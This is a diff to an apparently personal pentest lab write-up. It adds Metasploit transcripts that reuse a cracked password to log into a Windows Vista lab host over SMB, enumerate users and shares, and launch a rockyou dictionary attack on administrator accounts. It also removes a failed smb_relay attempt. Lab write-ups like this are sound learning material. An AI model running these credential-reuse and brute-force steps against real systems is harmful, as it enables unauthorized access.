@@ -238,6 +238,8 @@ Password for Jane is **pissoff**
 
 Very fitting, as October means summer is pissing off ;)
 
+Well, time to check the Windows box!
+
 # Windows Vista Business (build 6000)
 
 * Windows Vista Business (build 6000)
@@ -372,37 +374,7 @@ No active sessions.
 
 ```
 
-Seems I got nothing ... So I decided to change the share to one of the shares I found in the earlier step:
-
-```
-msf exploit(smb_relay) > jobs -K
-msf exploit(smb_relay) > set SHARE LH-0XZPOTYEAFVA
-SHARE => LH-0XZPOTYEAFVA
-msf exploit(smb_relay) > exploit
-[*] Exploit running as background job.
-
-[*] Started reverse handler on 192.168.248.132:7070 
-msf exploit(smb_relay) > [*] Server started.
-
-msf exploit(smb_relay) > jobs
-
-Jobs
-====
-
-  Id  Name
-  --  ----
-  2   Exploit: windows/smb/smb_relay
-
-msf exploit(smb_relay) > sessions
-
-Active sessions
-===============
-
-No active sessions.
-
-```
-
-Still, nothing :( Hmm ... Maybe I just misinterpreted the output of `nbtscan`? It's probably not share names but group/domain names. I'll try to smb_enumshares and see what we can get?
+Seems I got nothing ... Hmm ... Maybe I just misinterpreted the output of `nbtscan`? It's probably not share names but group/domain names. I'll try to smb_enumshares and see what we can get?
 
 ```
 msf > use auxiliary/scanner/smb/smb_enumshares
@@ -446,7 +418,186 @@ msf auxiliary(smb_enumshares) > run
 [*] Auxiliary module execution completed
 ```
 
-Seems like no matter what I do, the SMB server won't respond.
+### Using the loot from Ubuntu
+
+Well, now that we have some information from the compromised machine, we can use that to continue checking this Windows box.
+
+First of all, let's see if we can log in. Let's try with `User` and the password `summer` we cracked!
+
+#### Logging in
+```
+msf > use auxiliary/scanner/smb/smb_login
+msf auxiliary(smb_login) > show options
+
+Module options (auxiliary/scanner/smb/smb_login):
+
+   Name              Current Setting  Required  Description
+   ----              ---------------  --------  -----------
+   BLANK_PASSWORDS   false            no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
+   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
+   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
+   DB_ALL_USERS      false            no        Add all users in the current database to the list
+   PASS_FILE                          no        File containing passwords, one per line
+   PRESERVE_DOMAINS  true             no        Respect a username that contains a domain name.
+   RECORD_GUEST      false            no        Record guest-privileged random logins to the database
+   RHOSTS                             yes       The target address range or CIDR identifier
+   RPORT             445              yes       Set the SMB service port
+   SMBDomain                          no        SMB Domain
+   SMBPass                            no        SMB Password
+   SMBUser                            no        SMB Username
+   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
+   THREADS           1                yes       The number of concurrent threads
+   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
+   USER_AS_PASS      false            no        Try the username as the password for all users
+   USER_FILE                          no        File containing usernames, one per line
+   VERBOSE           true             yes       Whether to print output for all attempts
+
+msf auxiliary(smb_login) > set SMBPass summer
+SMBPass => summer
+msf auxiliary(smb_login) > set SMBUser User
+SMBUser => User
+msf auxiliary(smb_login) > set RHOSTS 192.168.248.131
+RHOSTS => 192.168.248.131
+msf auxiliary(smb_login) > run
+
+[*] 192.168.248.131:445 SMB - Starting SMB login bruteforce
+[+] 192.168.248.131:445 SMB - Success: 'WORKSTATION\User:summer'
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(smb_login) > 
+```
+
+Look at that! We got loggedin! :D Let's continue checking what other users exist on this system, maybe Jane is here?
+
+#### Enumerating users
+
+Using `smb_enumusers` and our log in, lets see what we find.
+
+```
+msf auxiliary(psexec_loggedin_users) > use auxiliary/scanner/smb/smb_enumusers
+msf auxiliary(smb_enumusers) > show options
+
+Module options (auxiliary/scanner/smb/smb_enumusers):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   RHOSTS                      yes       The target address range or CIDR identifier
+   SMBDomain  WORKGROUP        no        The Windows domain to use for authentication
+   SMBPass                     no        The password for the specified username
+   SMBUser                     no        The username to authenticate as
+   THREADS    1                yes       The number of concurrent threads
+
+msf auxiliary(smb_enumusers) > set RHOSTS 192.168.248.131
+RHOSTS => 192.168.248.131
+msf auxiliary(smb_enumusers) > set SMBUser User
+SMBUser => User
+msf auxiliary(smb_enumusers) > set SMBPass summer
+SMBPass => summer
+msf auxiliary(smb_enumusers) > run
+
+[*] 192.168.248.131 LH-0XZPOTYEAFVA [ Admin, Administrator, Guest, User ] ( LockoutTries=0 PasswordMin=0 )
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+
+Looks like Jane isn't here. But `Admin`, `Administrator`, `Guest` and our `User` is. Hmm, well, `Administrator` exists by default in Windows, but as far as I know, `Admin` does not. Maybe NOW we can get some shares, since we can log in! Lets see what shares are available here, let's use `smb_enumshares` and see what we find.
+
+
+#### Enumerating shares
+
+
+```
+msf > use auxiliary/scanner/smb/smb_enumshares
+msf auxiliary(smb_enumshares) > show options
+
+Module options (auxiliary/scanner/smb/smb_enumshares):
+
+   Name             Current Setting  Required  Description
+   ----             ---------------  --------  -----------
+   LogSpider        3                no        0 = disabled, 1 = CSV, 2 = table (txt), 3 = one liner (txt) (accepted: 0, 1, 2, 3)
+   MaxDepth         999              yes       Max number of subdirectories to spider
+   RHOSTS                            yes       The target address range or CIDR identifier
+   SMBDomain        WORKGROUP        no        The Windows domain to use for authentication
+   SMBPass                           no        The password for the specified username
+   SMBUser                           no        The username to authenticate as
+   ShowFiles        false            yes       Show detailed information when spidering
+   SpiderProfiles   true             no        Spider only user profiles when share = C$
+   SpiderShares     false            no        Spider shares recursively
+   THREADS          1                yes       The number of concurrent threads
+   USE_SRVSVC_ONLY  false            yes       List shares only with SRVSVC
+
+msf auxiliary(smb_enumshares) > set SMBUser User
+SMBUser => User
+msf auxiliary(smb_enumshares) > set SMBPass summer
+SMBPass => summer
+msf auxiliary(smb_enumshares) > set RHOSTS 192.168.248.131
+RHOSTS => 192.168.248.131
+msf auxiliary(smb_enumshares) > run
+
+[-] 192.168.248.131:139 - Login Failed: The SMB server did not reply to our request
+[*] 192.168.248.131:445 - Windows Vista Business (Build 6000) (Unknown)
+[+] 192.168.248.131:445 - ADMIN$ - (DISK) 
+[+] 192.168.248.131:445 - C$ - (DISK) 
+[+] 192.168.248.131:445 - IPC$ - (IPC) 
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+```
+
+Okay! So we know we have `ADMIN$`, `C$`and `IPC$`.
+
+After attempting to log in to `SAMBA` multiple times, it seems we have no read/write access to any of these shares. Damn. Dead-end? We need higher privileges. Alright so, lets try a dictionary attack against the users we found as well then.
+
+First, we make a list of the users and save it as `userlist`
+```
+root@battlestation:~# printf "Admin\nAdministrator\nGuest" > userlist
+```
+
+This will be the list of all users we'll try. Now, we'll use the same wordlist again and set that as our `PASS_FILE` and this user list as our `USER_FILE` for the `smb_login` auxiliary scanner module in metasploit. Hopefully, if we're lucky, we can find the right password for any of these users:
+
+```
+msf > use auxiliary/scanner/smb/smb_login
+msf auxiliary(smb_login) > show options
+
+Module options (auxiliary/scanner/smb/smb_login):
+
+   Name              Current Setting  Required  Description
+   ----              ---------------  --------  -----------
+   BLANK_PASSWORDS   false            no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
+   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
+   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
+   DB_ALL_USERS      false            no        Add all users in the current database to the list
+   PASS_FILE                          no        File containing passwords, one per line
+   PRESERVE_DOMAINS  true             no        Respect a username that contains a domain name.
+   RECORD_GUEST      false            no        Record guest-privileged random logins to the database
+   RHOSTS                             yes       The target address range or CIDR identifier
+   RPORT             445              yes       Set the SMB service port
+   SMBDomain                          no        SMB Domain
+   SMBPass                            no        SMB Password
+   SMBUser                            no        SMB Username
+   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
+   THREADS           1                yes       The number of concurrent threads
+   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
+   USER_AS_PASS      false            no        Try the username as the password for all users
+   USER_FILE                          no        File containing usernames, one per line
+   VERBOSE           true             yes       Whether to print output for all attempts
+
+msf auxiliary(smb_login) > set PASS_FILE /root/rockyou.txt
+PASS_FILE => /root/rockyou.txt
+msf auxiliary(smb_login) > set USER_FILE /root/userlist
+USER_FILE => /root/userlist
+msf auxiliary(smb_login) > set RHOSTS 192.168.248.131
+RHOSTS => 192.168.248.131
+msf auxiliary(smb_login) > set STOP_ON_SUCCESS true
+STOP_ON_SUCCESS => true
+msf auxiliary(smb_login) > run
+
+[*] 192.168.248.131:445 SMB - Starting SMB login bruteforce
+```
+
+So far ... Nothing. :(
 
 # Scan Results (OpenVAS)
 
